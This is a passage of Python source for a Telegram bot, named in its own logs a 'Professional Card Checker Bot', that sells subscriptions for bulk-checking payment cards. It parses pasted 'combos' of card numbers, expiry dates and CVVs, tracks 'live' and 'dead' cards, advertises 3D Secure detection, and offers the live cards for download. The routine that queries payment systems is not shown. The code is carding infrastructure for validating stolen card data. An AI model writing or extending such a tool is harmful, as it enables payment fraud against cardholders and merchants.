            f"├ Active (24h): **{stats.active_users:,}**\n"
            f"└ Currently checking: **{stats.active_checkers:,}**\n\n"
            f"🔍 **Checking:**\n"
            f"├ Total checks: **{stats.total_checks:,}**\n"
            f"├ Today's checks: **{stats.daily_checks:,}**\n"
            f"├ Live cards found: **{stats.total_live_cards:,}**\n"
            f"└ Success rate: **{self.card_checker.get_success_rate():.1f}%**\n\n"
            f"⚡ **Performance:**\n"
            f"├ Bot uptime: **{uptime_str}**\n"
            f"├ Active sessions: **{len(self.checking_tasks)}**\n"
            f"└ Check speed: **{CHECK_DELAY}s per card**"
        )
        
        await update.message.reply_text(text, parse_mode="Markdown")
    
    async def receive_cards(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Enhanced card input handler"""
        chat_id = update.effective_chat.id
        user_data = self.data_manager.get_user(chat_id, update.effective_user.username or "")
        
        if not self.data_manager.is_subscription_active(chat_id):
            await update.message.reply_text(
                "❌ **Subscription required!**\n\n"
                f"You need an active subscription to use the bot.\n\n"
                f"📞 **Contact for subscription:** {PAYMENT_CONTACT}",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("💎 View Plans", callback_data="subscription")],
                    [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
                ])
            )
            return
        
        # Stop current checking if running
        if user_data.is_checking:
            await update.message.reply_text(
                "⚠️ **Please stop the current check first!**",
                parse_mode="Markdown"
            )
            return
        
        # Parse cards with validation
        text = update.message.text.strip()
        lines = [line.strip() for line in text.split("\n") if line.strip()]
        
        valid_cards = []
        invalid_cards = []
        
        for line in lines:
            if "|" in line:
                parts = line.split("|")
                if len(parts) == 4:
                    try:
                        number, month, year, cvv = parts
                        # Basic validation
                        if (number.isdigit() and len(number) >= 13 and
                            month.isdigit() and 1 <= int(month) <= 12 and
                            year.isdigit() and (len(year) == 2 or len(year) == 4) and
                            cvv.isdigit() and len(cvv) >= 3):
                            valid_cards.append(line)
                        else:
                            invalid_cards.append(line)
                    except:
                        invalid_cards.append(line)
                else:
                    invalid_cards.append(line)
        
        if not valid_cards:
            await update.message.reply_text(
                "❌ **No valid cards found!**\n\n"
                "**Correct format:**\n"
                "`Number|MM|YYYY|CVV`\n\n"
                "**Example:**\n"
                "`4532123456789012|12|2025|123`",
                parse_mode="Markdown"
            )
            return
        
        # Reset session for new combo
        user_data.cards = valid_cards
        user_data.live_cards = []
        user_data.current_index = 0
        user_data.is_checking = False
        user_data.is_paused = False
        
        self.data_manager.save_user(user_data)
        
        response_text = f"✅ **Combo loaded successfully!**\n\n"
        response_text += f"📊 **Valid cards:** **{len(valid_cards):,}**\n"
        
        if invalid_cards:
            response_text += f"⚠️ **Invalid cards:** **{len(invalid_cards)}**\n"
        
        response_text += f"\n🚀 **Ready to start checking!**"
        
        await update.message.reply_text(
            response_text,
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("▶️ Start Checking", callback_data="start_check")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
            ])
        )
    
    async def callback_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Enhanced callback handler"""
        query = update.callback_query
        await query.answer()
        
        chat_id = query.message.chat.id
        message_id = query.message.message_id
        username = query.from_user.username or ""
        
        user_data = self.data_manager.get_user(chat_id, username)
        
        # Main menu callbacks
        if query.data == "main_menu":
            await self.send_main_menu(context, chat_id, message_id)
        
        # Admin panel callbacks
        elif query.data == "admin_panel":
            await self.send_admin_panel(context, chat_id, message_id)
        
        elif query.data == "admin_users":
            await self.send_user_list(context, chat_id, message_id, 0)
        
        elif query.data.startswith("admin_users_"):
            page = int(query.data.split("_")[-1])
            await self.send_user_list(context, chat_id, message_id, page)
        
        elif query.data == "admin_stats":
            if chat_id != ADMIN_ID:
                return
            
            stats = self.data_manager.get_stats()
            text = (
                f"📊 **DETAILED STATISTICS**\n\n"
                f"👥 **User Analytics:**\n"
                f"├ Total Users: **{stats.total_users:,}**\n"
                f"├ Active (24h): **{stats.active_users:,}**\n"
                f"├ Active Checkers: **{stats.active_checkers:,}**\n"
                f"└ Conversion Rate: **{(stats.active_users/max(stats.total_users,1)*100):.1f}%**\n\n"
                f"🔍 **Checking Analytics:**\n"
                f"├ Total Checks: **{stats.total_checks:,}**\n"
                f"├ Daily Checks: **{stats.daily_checks:,}**\n"
                f"├ Live Cards: **{stats.total_live_cards:,}**\n"
                f"└ Overall Success: **{self.card_checker.get_success_rate():.1f}%**\n\n"
                f"⚡ **Performance:**\n"
                f"├ Active Sessions: **{len(self.checking_tasks)}**\n"
                f"├ Check Speed: **{CHECK_DELAY}s/card**\n"
                f"└ Cards/Hour: **{3600//CHECK_DELAY:,}**"
            )
            
            await query.edit_message_text(
                text,
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 Refresh", callback_data="admin_stats")],
                    [InlineKeyboardButton("🔧 Admin Panel", callback_data="admin_panel")]
                ])
            )
        
        # Subscription callbacks
        elif query.data == "subscription":
            text = (
                f"💎 **SUBSCRIPTION PLANS**\n\n"
                f"Choose the perfect plan for your needs:\n\n"
                f"🔥 **All plans include:**\n"
                f"├ Unlimited card checking\n"
                f"├ Real-time live notifications\n"
                f"├ Advanced 3D Secure detection\n"
                f"├ Detailed analytics\n"
                f"└ Premium support\n\n"
                f"💰 Contact for pricing details\n"
                f"📞 **Subscription:** {PAYMENT_CONTACT}"
            )
            await query.edit_message_text(
                text,
                parse_mode="Markdown",
                reply_markup=self.get_subscription_keyboard()
            )
        
        elif query.data.startswith("sub_"):
            plan_id = query.data[4:]
            plan_info = SUBSCRIPTION_PLANS.get(plan_id)
            
            if plan_info:
                text = (
                    f"📦 **{plan_info['name'].upper()}**\n\n"
                    f"💰 **Price:** {plan_info['price']}\n"
                    f"⏰ **Duration:** {plan_info['name']}\n\n"
                    f"🔥 **Includes everything:**\n"
                    f"├ Unlimited checking\n"
                    f"├ Real-time notifications\n"
                    f"├ Advanced detection\n"
                    f"├ Priority support\n"
                    f"└ Detailed analytics\n\n"
                    f"📞 **Contact:** {PAYMENT_CONTACT}\n"
                    f"🆔 **Your ID:** `{chat_id}`\n\n"
                    f"💬 Send your ID with plan name to activate!"
                )
                await query.edit_message_text(
                    text,
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
                    ])
                )
        
        # Checking callbacks
        elif query.data == "start_check":
            if not self.data_manager.is_subscription_active(chat_id):
                await query.edit_message_text(
                    "❌ **Subscription expired!**\n\nPlease renew to continue.",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("💎 Renew Subscription", callback_data="subscription")]
                    ])
                )
                return
            
            if not user_data.cards:
                await query.edit_message_text(
                    "❌ **No combo loaded!**\n\nPlease add cards first.",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("📋 Add Combo", callback_data="add_cards")],
                        [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
                    ])
                )
                return
            
            if user_data.is_checking:
                await query.edit_message_text("⚠️ **Already checking!**", parse_mode="Markdown")
                return
            
            if user_data.current_index >= len(user_data.cards):
                await query.edit_message_text(
                    "✅ **All cards checked!**\n\nLoad new combo to start fresh.",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("📋 New Combo", callback_data="add_cards")],
                        [InlineKeyboardButton("📊 Results", callback_data="view_results")]
                    ])
                )
                return
            
            # Start checking
            user_data.is_checking = True
            user_data.is_paused = False
            
            # Create status message
            msg = await context.bot.send_message(
                chat_id,
                "🚀 **INITIALIZING CHECKER...**\n\nPlease wait...",
                parse_mode="Markdown",
                reply_markup=self.get_checking_keyboard(False)
            )
            user_data.status_message_id = msg.message_id
            
            self.data_manager.save_user(user_data)
            
            # Start checking task
            task = asyncio.create_task(self.run_checker(context, chat_id))
            self.checking_tasks[chat_id] = task
            
            await query.delete_message()
        
        # Control callbacks for checking
        elif query.data == "pause":
            user_data.is_paused = True
            self.data_manager.save_user(user_data)
            await self.update_checking_status(context, chat_id, user_data)
        
        elif query.data == "resume":
            user_data.is_paused = False
            self.data_manager.save_user(user_data)
            await self.update_checking_status(context, chat_id, user_data)
        
        elif query.data == "refresh_status":
            await self.update_checking_status(context, chat_id, user_data)
        
        elif query.data == "stop_check":
            user_data.is_checking = False
            user_data.is_paused = False
            
            # Cancel task
            if chat_id in self.checking_tasks:
                self.checking_tasks[chat_id].cancel()
                del self.checking_tasks[chat_id]
            
            self.data_manager.save_user(user_data)
            
            await query.edit_message_text(
                f"⏹️ **CHECKING STOPPED**\n\n"
                f"📊 **Results so far:**\n"
                f"├ Live Cards: **{len(user_data.live_cards):,}**\n"
                f"├ Checked: **{user_data.current_index:,}**\n"
                f"├ Remaining: **{len(user_data.cards) - user_data.current_index:,}**\n"
                f"└ Success Rate: **{user_data.success_rate:.1f}%**",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📊 View Results", callback_data="view_results")],
                    [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
                ])
            )
        
        # Other callbacks
        elif query.data == "add_cards":
            if not self.data_manager.is_subscription_active(chat_id):
                await query.edit_message_text(
                    "❌ **Subscription required!**\n\n"
                    f"📞 **Contact:** {PAYMENT_CONTACT}",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("💎 View Plans", callback_data="subscription")],
                        [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
                    ])
                )
                return
            
            text = (
                f"📋 **ADD NEW COMBO**\n\n"
                f"Send your cards in this format:\n"
                f"`Number|MM|YYYY|CVV`\n\n"
                f"**Example:**\n"
                f"`4532123456789012|12|2025|123`\n"
                f"`4916123456789012|01|2026|456`\n\n"
                f"📝 **You can send multiple cards** (one per line)\n"
                f"🔍 **Invalid cards will be filtered out automatically**"
            )
            await query.edit_message_text(
                text,
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
                ])
            )
        
        elif query.data == "view_results":
            if not user_data.cards:
                await query.edit_message_text(
                    "ℹ️ **No results to display.**",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
                    ])
                )
                return
            
            # Show preview of live cards
            live_cards_preview = ""
            if user_data.live_cards:
                preview_cards = user_data.live_cards[:3]  # Show first 3
                live_cards_preview = "\n".join([f"`{card}`" for card in preview_cards])
                if len(user_data.live_cards) > 3:
                    live_cards_preview += f"\n... and **{len(user_data.live_cards) - 3}** more"
            else:
                live_cards_preview = "*No live cards found yet*"
            
            progress_percentage = (user_data.current_index / len(user_data.cards)) * 100 if user_data.cards else 0
            
            text = (
                f"📊 **CHECKING RESULTS**\n\n"
                f"📈 **Progress:** {progress_percentage:.1f}% completed\n"
                f"📋 **Total Cards:** {len(user_data.cards):,}\n"
                f"🔍 **Checked:** {user_data.current_index:,}\n"
                f"✅ **Live Cards:** {len(user_data.live_cards):,}\n"
                f"❌ **Dead Cards:** {user_data.current_index - len(user_data.live_cards):,}\n"
                f"📈 **Success Rate:** {user_data.success_rate:.1f}%\n\n"
                f"🔥 **Live Cards Preview:**\n{live_cards_preview}"
            )
            
            keyboard = []
            if user_data.live_cards:
                keyboard.append([InlineKeyboardButton("📥 Download Files", callback_data="download")])
            
            keyboard.extend([
                [InlineKeyboardButton("🔍 New Check", callback_data="add_cards")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
            ])
            
            await query.edit_message_text(
                text,
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        
        elif query.data == "download":
            await query.answer("📥 Preparing files...")
            await self.send_results_files(context, chat_id)
        
        elif query.data == "account_info":
            is_active = self.data_manager.is_subscription_active(chat_id)
            
            if is_active:
                expires_at = datetime.fromtimestamp(user_data.subscription.expires_at)
                remaining_time = expires_at - datetime.now()
                
                if remaining_time.total_seconds() > 86400:  # More than 1 day
                    days = int(remaining_time.total_seconds() // 86400)
                    time_left = f"{days} day{'s' if days > 1 else ''}"
                elif remaining_time.total_seconds() > 3600:  # More than 1 hour
                    hours = int(remaining_time.total_seconds() // 3600)
                    time_left = f"{hours} hour{'s' if hours > 1 else ''}"
                else:
                    minutes = int(remaining_time.total_seconds() // 60)
                    time_left = f"{minutes} minute{'s' if minutes > 1 else ''}"
                
                status_text = f"✅ **Active** ({time_left} left)"
                plan_text = f"📦 **Plan:** {SUBSCRIPTION_PLANS.get(user_data.subscription.plan, {}).get('name', 'Unknown')}"
            else:
                status_text = "❌ **Inactive**"
                plan_text = "📦 **Plan:** None"
            
            last_activity = datetime.fromtimestamp(user_data.last_activity).strftime('%Y-%m-%d %H:%M')
            
            text = (
                f"👤 **ACCOUNT INFORMATION**\n\n"
                f"🆔 **User ID:** `{chat_id}`\n"
                f"👤 **Username:** @{username or 'Unknown'}\n"
                f"📊 **Status:** {status_text}\n"
                f"{plan_text}\n\n"
                f"📈 **Statistics:**\n"
                f"├ Cards Loaded: **{len(user_data.cards):,}**\n"
                f"├ Live Cards: **{len(user_data.live_cards):,}**\n"
                f"├ Total Checked: **{user_data.total_checked:,}**\n"
                f"├ Success Rate: **{user_data.success_rate:.1f}%**\n"
                f"└ Last Activity: **{last_activity}**"
            )
            
            keyboard = []
            if not is_active:
                keyboard.append([InlineKeyboardButton("💎 Get Subscription", callback_data="subscription")])
            
            keyboard.append([InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")])
            
            await query.edit_message_text(
                text,
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        
        elif query.data == "clear_data":
            text = (
                f"⚠️ **CONFIRM DATA DELETION**\n\n"
                f"This will permanently delete:\n"
                f"├ **{len(user_data.cards):,}** cards from combo\n"
                f"├ **{len(user_data.live_cards):,}** live cards\n"
                f"├ All checking progress\n"
                f"└ All session data\n\n"
                f"**Are you absolutely sure?**"
            )
            await query.edit_message_text(
                text,
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("✅ Yes, Delete All", callback_data="confirm_clear")],
                    [InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]
                ])
            )
        
        elif query.data == "confirm_clear":
            # Stop checking if running
            if user_data.is_checking:
                user_data.is_checking = False
                if chat_id in self.checking_tasks:
                    self.checking_tasks[chat_id].cancel()
                    del self.checking_tasks[chat_id]
            
            # Clear all data
            cards_count = len(user_data.cards)
            live_count = len(user_data.live_cards)
            
            user_data.cards = []
            user_data.live_cards = []
            user_data.current_index = 0
            user_data.is_checking = False
            user_data.is_paused = False
            user_data.status_message_id = None
            
            self.data_manager.save_user(user_data)
            
            await query.edit_message_text(
                f"✅ **DATA CLEARED SUCCESSFULLY!**\n\n"
                f"🗑️ **Deleted:**\n"
                f"├ **{cards_count:,}** cards\n"
                f"├ **{live_count:,}** live cards\n"
                f"└ All progress data\n\n"
                f"🚀 **Ready for new combo!**",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📋 Add New Combo", callback_data="add_cards")],
                    [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
                ])
            )
        
        # Admin-only callbacks
        elif query.data == "admin_add_sub":
            if chat_id != ADMIN_ID:
                return
            
            text = (
                f"💎 **ADD SUBSCRIPTION**\n\n"
                f"Use the command format:\n"
                f"`/admin <user_id> <plan> <hours>`\n\n"
                f"**Available Plans:**\n"
                + "\n".join([f"• `{plan_id}` - {info['name']}" 
                           for plan_id, info in SUBSCRIPTION_PLANS.items()]) +
                f"\n\n**Example:**\n"
                f"`/admin 123456789 1_day 24`"
            )
            
            await query.edit_message_text(
                text,
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔧 Admin Panel", callback_data="admin_panel")]
                ])
            )
        
        elif query.data == "admin_search":
            if chat_id != ADMIN_ID:
                return
            
            await query.edit_message_text(
                f"🔍 **SEARCH USER**\n\n"
                f"Send user ID or username to search:\n"
                f"• User ID: `123456789`\n"
                f"• Username: `@username`\n\n"
                f"💡 **Tip:** You can also use `/admin` command directly",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔧 Admin Panel", callback_data="admin_panel")]
                ])
            )
        
        elif query.data == "admin_broadcast":
            if chat_id != ADMIN_ID:
                return
            
            await query.edit_message_text(
                f"📢 **BROADCAST MESSAGE**\n\n"
                f"Send your message to broadcast to all users.\n\n"
                f"⚠️ **Warning:** This will send to ALL {self.data_manager.get_stats().total_users} users!\n\n"
                f"💡 Use format: `/broadcast Your message here`",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔧 Admin Panel", callback_data="admin_panel")]
                ])
            )
        
        elif query.data == "admin_analytics":
            if chat_id != ADMIN_ID:
                return
            
            stats = self.data_manager.get_stats()
            users = self.data_manager.get_all_users()
            
            # Calculate additional analytics
            active_subscribers = sum(1 for user in users if self.data_manager.is_subscription_active(user.user_id))
            total_live_found = sum(len(user.live_cards) for user in users)
            avg_success_rate = sum(user.success_rate for user in users if user.success_rate > 0) / max(1, len([u for u in users if u.success_rate > 0]))
            
            text = (
                f"📈 **ADVANCED ANALYTICS**\n\n"
                f"👥 **User Metrics:**\n"
                f"├ Total Users: **{stats.total_users:,}**\n"
                f"├ Active (24h): **{stats.active_users:,}**\n"
                f"├ Active Subs: **{active_subscribers:,}**\n"
                f"└ Retention: **{(stats.active_users/max(stats.total_users,1)*100):.1f}%**\n\n"
                f"🔍 **Performance:**\n"
                f"├ Total Checks: **{stats.total_checks:,}**\n"
                f"├ Live Found: **{total_live_found:,}**\n"
                f"├ Avg Success: **{avg_success_rate:.1f}%**\n"
                f"└ Cards/Hour: **{3600//CHECK_DELAY:,}**\n\n"
                f"⚡ **System:**\n"
                f"├ Active Sessions: **{len(self.checking_tasks)}**\n"
                f"├ Check Speed: **{CHECK_DELAY}s**\n"
                f"└ Efficiency: **{(stats.daily_checks/(stats.active_users or 1)):.1f}** checks/user"
            )
            
            await query.edit_message_text(
                text,
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 Refresh", callback_data="admin_analytics")],
                    [InlineKeyboardButton("🔧 Admin Panel", callback_data="admin_panel")]
                ])
            )
        
        elif query.data == "admin_settings":
            if chat_id != ADMIN_ID:
                return
            
            await query.edit_message_text(
                f"⚙️ **BOT SETTINGS**\n\n"
                f"📊 **Current Configuration:**\n"
                f"├ Check Delay: **{CHECK_DELAY}s**\n"
                f"├ Admin ID: **{ADMIN_ID}**\n"
                f"├ Payment Contact: **{PAYMENT_CONTACT}**\n"
                f"├ Database: **{DATABASE_FILE}**\n"
                f"└ Active Tasks: **{len(self.checking_tasks)}**\n\n"
                f"🔧 **Available Commands:**\n"
                f"• `/admin` - Manage subscriptions\n"
                f"• `/stats` - Quick statistics\n"
                f"• `/broadcast` - Send message to all\n\n"
                f"💡 **Tip:** Settings are configured in environment variables",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔧 Admin Panel", callback_data="admin_panel")]
                ])
            )


def main():
    """Enhanced main function with better error handling"""
    logger.info("🚀 Starting Professional Card Checker Bot (English Version)...")
    
    try:
        bot = TelegramBot()
        app = ApplicationBuilder().token(TOKEN).build()
        
        # Set bot commands
        commands = [
            BotCommand("start", "🚀 Start the bot"),
            BotCommand("admin", "🔧 Admin panel (Admin only)"),
            BotCommand("stats", "📊 Bot statistics (Admin only)")
        ]
        
        async def set_commands():
            await app.bot.set_my_commands(commands)
        
        # Command handlers
        app.add_handler(CommandHandler("start", bot.start_command))
        app.add_handler(CommandHandler("admin", bot.admin_command))
        app.add_handler(CommandHandler("stats", bot.stats_command))
        
        # Callback handler
        app.add_handler(CallbackQueryHandler(bot.callback_handler))
        
        # Card input handler
        app.add_handler(MessageHandler(
            filters.TEXT & ~filters.COMMAND, 
            bot.receive_cards
        ))
        
        # Set commands
        asyncio.create_task(set_commands())
        
        logger.info("✅ Professional Card Checker Bot is running!")
        logger.info(f"📊 Admin ID: {ADMIN_ID}")
        logger.info(f"⚡ Check Delay: {CHECK_DELAY}s")
        logger.info(f"🔧 Features: Enhanced admin panel, SQLite database, real-time analytics")
        
        app.run_polling()
        
    except Exception as e:
        logger.error(f"❌ Fatal error starting bot: {e}")
        raise


if __name__ == "__main__":
    main()
